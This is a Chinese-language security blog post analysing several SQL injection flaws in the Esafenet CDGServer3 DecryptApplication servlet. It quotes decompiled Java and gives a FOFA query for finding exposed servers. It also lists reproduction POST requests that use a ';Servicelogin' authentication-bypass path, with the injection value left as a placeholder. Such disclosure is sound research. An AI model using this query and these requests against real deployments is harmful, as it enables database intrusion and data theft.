---
title: "亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞"
source: https://mrxn.net/jswz/CDGServer3-client-DecryptApplication-sqli.html
---

# 亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/9/1 09:49
* 709浏览
* [0评论](#comment)
* 2小时
  阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

亿赛通电子文档安全管理系统的DecryptApplication接口存在SQL注入漏洞。攻击者可以通过构造特定的POST请求，在flowId参数中注入恶意SQL代码，利用该漏洞对数据库执行任意SQL操作。攻击者可以通过注入WAITFOR DELAY命令，导致数据库响应时间延迟，从而确认
[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
的成功。此漏洞可能导致数据库中的敏感信息泄露、篡改或删除，严重威胁系统的安全性和数据完整性。

# 影响版本

# fofa语法

> app="亿赛通-电子文档安全管理系统" || body="/CDGServer3/index.jsp"

# 漏洞分析

PS: 相关权限绕过简析参考
[亿赛通电子文档安全管理系统 AppExamList.jsp SQL注入漏洞](https://mrxn.net/jswz/esafenet-AppExamList-sqli.html)

根据 web.xml 里对
`DecryptApplication`
的定义

```
<!-- DecryptApplication -->
<servlet>
    <servlet-name>DecryptApplication</servlet-name>
    <display-name>DecryptApplication</display-name>
    <servlet-class>
       com.esafenet.servlet.client.DecryptApplicationService
    </servlet-class>
</servlet>

<servlet-mapping>
    <servlet-name>DecryptApplication</servlet-name>
    <url-pattern>/client/DecryptApplication</url-pattern>
</servlet-mapping>
```

可知，访问路由为 /client/DecryptApplication ，具体实现逻辑类为
`com.esafenet.servlet.client.DecryptApplicationService`

## delDecryptApplication

跟进查看
`delDecryptApplication`
实现方式

```
public void actionDelDecryptApplication(HttpServletRequest req, HttpServletResponse res) throws IOException, ServletException, Exception {
    String fromurl = RequestUtil.getParameter(req, "fromurl", "");
    String id = RequestUtil.getParameter(req, "id", "");
    this.model.delDecryptApplication(id);
    if (CDGUtil.isGF()) {
        res.sendRedirect(fromurl);
    } else {
        req.getRequestDispatcher(fromurl).forward(req, res);
    }

}
```

将请求的参数如
`id`
带入
`delDecryptApplication`
方法

```
public void delDecryptApplication(String id) throws Exception {
    Map setMap = new HashMap();
    Map updateMap = new HashMap();
    setMap.put("HasDeleted", "1");
    setMap.put("Field02", CDGUtil.getCurrentTime());
    updateMap.put("uniqueid", id);
    this.decryptApplicationDao.update(setMap, updateMap);
}
```

继续跟进
`decryptApplicationDao.update`
方法

```
public void update(Map setM, Map updateM) throws Exception {
    StringBuffer toSetSb = new StringBuffer(" ");
    StringBuffer updateSb = new StringBuffer(" ");
    Set setMap = setM.entrySet();
    Set updateMap = updateM.entrySet();
    if (setMap != null && updateMap != null && setMap.size() != 0 && updateMap.size() != 0) {
        Iterator iter = setMap.iterator();

        while(iter.hasNext()) {
            Map.Entry element = (Map.Entry)iter.next();
            if (iter.hasNext()) {
                toSetSb.append(element.getKey().toString()).append("=").append("'").append(this.verifyString(element).toString()).append("',");
            } else {
                toSetSb.append(element.getKey().toString()).append("=").append("'").append(this.verifyString(element).toString()).append("' ");
            }
        }

        iter = updateMap.iterator();

        while(iter.hasNext()) {
            Map.Entry element = (Map.Entry)iter.next();
            if (iter.hasNext()) {
                updateSb.append(element.getKey().toString()).append("=").append("'").append(this.verifyString(element).toString()).append("' and ");
            } else {
                updateSb.append(element.getKey().toString()).append("=").append("'").append(this.verifyString(element).toString()).append("' ");
            }
        }

        String sql = "update " + tableName + " SET " + toSetSb.toString() + " where " + updateSb.toString();
        this.updateCommon(sql);
    }
```

主要为组装sql语句后直接执行，可见参数全程未经任何过滤和校验就被直接拼接进sql语句中进行执行，从而导致
[sql注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
。

## DownLoadLogs

```
public void actionDownLoadLogs(HttpServletRequest req, HttpServletResponse res) throws IOException, ServletException, Exception {
    String isdeled = RequestUtil.getParameter(req, "isdeled", "");
    String isExam = RequestUtil.getParameter(req, "isExam", "");
    String type = "解密申请";
    this.model.downLoadLogs(isdeled, isExam, req, res, type);
}
```

跟进
`downLoadLogs`
方法

```
public void downLoadLogs(String isdeled, String isExam, HttpServletRequest req, HttpServletResponse res, String type) throws IOException {
    String ip = RequestUtil.getParameter(req, "ip", "");
    String machineName = RequestUtil.getParameter(req, "machineName", "");
    res.setContentType("csv");
    res.setHeader("Content-Disposition", "attachment;filename=\"log.csv\"");
    res.setContentType("text/plain;charset=GB2312");
    PrintWriter out = null;

    try {
        out = res.getWriter();
        out.println("客户端,申请人,类型,审批人,审批日期,备注,申请时间");
        List<DecryptApplicationInfo> list = getLogs(isdeled, isExam, ip, machineName);
```

跟进
`getLogs`
方法

```
private static List<DecryptApplicationInfo> getLogs(String isdeled, String isExam, String ip, String machineName) throws Exception {
    DecryptApplicationDao dao = new DecryptApplicationDao();
    Map map = new HashMap();
    map.put("HasDeleted", isdeled);
    if (!"".equals(isExam)) {
        map.put("HasExam", isExam);
    }

    if (!"".equals(ip)) {
        map.put("Ip", ip);
    }

    if (!"".equals(machineName)) {
        map.put("MachineName", machineName);
    }

    return dao.getList(map);
}
```

继续跟进
`getList`
方法

```
public List<DecryptApplicationInfo> getList(Map map) throws Exception {
    List<DecryptApplicationInfo> list = new ArrayList();
    StringBuffer sql = new StringBuffer();
    sql.append("select * from " + tableName);
    String where = CDGUtil.getWhereClauseForString(map);
    sql.append(where);
    HashMap[] maps = this.getCommonResults(sql.toString());
    if (maps != null && maps.length > 0) {
        for(int i = 0; i < maps.length; ++i) {
            list.add(MapToInfo(maps[i]));
        }
    }

    return list;
}
```

喏，又是和前面一样的组装完成sql语句后直接执行，全程无过滤或校验，从而造成
[sql注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
漏洞。

## DelAllDecryptApplication

```
public void actionDelAllDecryptApplication(HttpServletRequest req, HttpServletResponse res) throws IOException, ServletException, Exception {
    String fromurl = RequestUtil.getParameter(req, "fromurl", "");
    String[] strs = RequestUtil.getParameters(req, "allCheckbox");

    for(int i = 0; strs != null && i < strs.length; ++i) {
        this.model.delDecryptApplication(strs[i]);
    }

    req.getRequestDispatcher(fromurl).forward(req, res);
}
```

跟进delDecryptApplication方法

```
public void delDecryptApplication(String id) throws Exception {
    Map setMap = new HashMap();
    Map updateMap = new HashMap();
    setMap.put("HasDeleted", "1");
    setMap.put("Field02", CDGUtil.getCurrentTime());
    updateMap.put("uniqueid", id);
    this.decryptApplicationDao.update(setMap, updateMap);
}
```

又遇见熟悉的
`decryptApplicationDao.update`
方法了，在上面已经分析过了，这里就不赘述了。

## PassDecryptApplication

```
public void actionPassDecryptApplication(HttpServletRequest req, HttpServletResponse res) throws IOException, ServletException, Exception {
    log.info("执行审批通过业务:" + CDGUtil.getTime());
    String fromurl = RequestUtil.getParameter(req, "fromurl", "");
    String id = RequestUtil.getParameter(req, "id", "");
    String uploadFile = RequestUtil.getParameter(req, "uploadFile", "");
    DecryptApplicationInfo info = this.model.findById(id);
```

跟进
`findById`
方法

```
public DecryptApplicationInfo findById(String id) throws Exception {
    StringBuffer sql = new StringBuffer();
    sql.append("select * from " + tableName);
    Map<String, String> map = new HashMap();
    map.put("Uniqueid", id);
    String where = CDGUtil.getWhereClauseForString(map);
    sql.append(where);
    HashMap[] maps = this.getCommonResults(sql.toString());
    if (maps != null && maps.length > 0) {
        DecryptApplicationInfo info = MapToInfo(maps[0]);
        return info;
    } else {
        return null;
    }
}
```

也是熟悉的方法组装sql语句后执行，造成
[sql注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
漏洞。

## OpposeDecryptApplication

![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](https://image.mrxn.net/4338b3847b03437bb31de694830cdd9a.webp)

和上面的一样

## Examing

```
public void actionExaming(HttpServletRequest req, HttpServletResponse res) throws IOException, ServletException, Exception {
    String fromurl = RequestUtil.getParameter(req, "fromurl", "");
    String appId = RequestUtil.getParameter(req, "appId", "");

    try {
        this.model.changeSome(appId, req);
```

跟进
`changeSome`
方法

```
public void changeSome(String appId, HttpServletRequest req) throws Exception {
    List<DecryptFileVO> decryptFiles = this.getPassFileForAppId(appId);
    String appUser = req.getParameter("appUser");
    this.examApplication_1_Socket(1, decryptFiles, appUser);
    this.examApplication_2_Db(req, appId, decryptFiles, "", "");
}

private List<DecryptFileVO> getPassFileForAppId(String appId) throws Exception {
    Map map = new HashMap();
    map.put("DecryptApplicationId", appId);
    map.put("IsApproval", new Integer(1));
    List<DecryptFileInfo> list = this.decryptFileDao.findByPrecise(map);
```

跟进
`findByPrecise`
方法

```
public List<DecryptFileInfo> findByPrecise(Map map) throws Exception {
    StringBuffer sql = new StringBuffer();
    sql.append("select * from " + tableName);
    sql.append(CDGUtil.getWhereClauseForString(map));
    HashMap[] maps = this.getCommonResults(sql.toString());
```

同样也是组装sql语句后执行，造成
[sql注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
漏洞。

## UpLoadDecyptFile

![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](https://image.mrxn.net/8a24004dce5642639cf97e564f176a20.webp)

![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](https://image.mrxn.net/d1bb1e7ba41f446e86eede337c7cb681.webp)

![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](https://image.mrxn.net/000df6495a464dedaacfaa37d04ed3c3.webp)

## DelDecyptFile

![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](https://image.mrxn.net/12d3543776e54a79853fb094066496c2.webp)

![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](https://image.mrxn.net/8dce46f3814b4e1bafed3e9c767ebc77.webp)

## PassDecryptApplication1

![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](https://image.mrxn.net/278f3a97f0964081b93f06a73a96e703.webp)

![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](https://image.mrxn.net/ac84a50bd52d41eb84632cd088862302.webp)

## DelDecryptApplication2

![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](https://image.mrxn.net/0d18a0a1ca094e6989bd4d7791037fb4.webp)

![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](https://image.mrxn.net/be8b8b2500614c9a9f7359a48bfc00a4.webp)

## OpposeDecryptApplication2

![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](https://image.mrxn.net/5119a19630c342f696861a5cfa9216d9.webp)

![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](https://image.mrxn.net/ebaf2415880a4a00a8e21da8e7841ca3.webp)

## DelAllDecryptApplication2

![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](https://image.mrxn.net/4eaa007ca5104e4b87a710b5dcbf60ea.webp)

# 漏洞复现

## DelDecryptApplication

```
POST /CDGServer3/client/DecryptApplication;Servicelogin HTTP/1.1
Host: CDGServer3.mrxn.net
Content-Type: application/x-www-form-urlencoded

id=SQLI_POC&machineId=&command=DelDecryptApplication&fromurl=/frame.jsp&appUser=
```

![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](https://image.mrxn.net/9bfc1c58a1374de7ab0c5537a0f28629.webp)

成功延时 5 秒

## DownLoadLogs

```
POST /CDGServer3/client/DecryptApplication;Servicelogin HTTP/1.1
Host: CDGServer3.mrxn.net
Content-Type: application/x-www-form-urlencoded

isdeled=SQLI_POC&isExam=&command=DownLoadLogs
```

![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](https://image.mrxn.net/f55bf75cc4304ba5959ab663fb261e5d.webp)

成功延时 5 秒

## DelAllDecryptApplication

```
POST /CDGServer3/client/DecryptApplication;Servicelogin HTTP/1.1
Host: CDGServer3.mrxn.net
Content-Type: application/x-www-form-urlencoded

allCheckbox=SQLI_POC&fromurl=DeletedDecryptApplication2.jsp&command=DelAllDecryptApplication
```

![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](https://image.mrxn.net/3a56803602b147e1b161e270619ab97f.webp)

成功延时 5 秒

## PassDecryptApplication

```
POST /CDGServer3/client/DecryptApplication;Servicelogin HTTP/1.1
Host: CDGServer3.mrxn.net
Content-Type: application/x-www-form-urlencoded

id=SQLI_POC&fromurl=UnChkDecryptAppliction.jsp;jsessionid=E3D7E1E37FB207B0B1E1370638516643&command=PassDecryptApplication&uploadFile=1
```

![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](https://image.mrxn.net/514be14711ff4a6ebac12f6e106008a5.webp)

## OpposeDecryptApplication

![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](https://image.mrxn.net/44d522d1d0e74a59bba2ef5e0ec26434.webp)

## Examing

![亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](https://image.mrxn.net/f348f76e363f49f2902de1b0a7dffe80.webp)

* 标签：
* [#
  漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#
  web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#
  SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#
  代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#
  Java](https://mrxn.net/tag/Java)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录

×



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：
[Mrxn's Blog](https://mrxn.net/)
  
文章标题：
[亿赛通-电子文档安全管理系统 DecryptApplication 多处SQL注入漏洞](https://mrxn.net/jswz/CDGServer3-client-DecryptApplication-sqli.html)
  
文章链接：
<https://mrxn.net/jswz/CDGServer3-client-DecryptApplication-sqli.html>
  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

设备上扫码阅读



var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/CDGServer3-client-DecryptApplication-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

手机扫码阅读



var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/CDGServer3-client-DecryptApplication-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});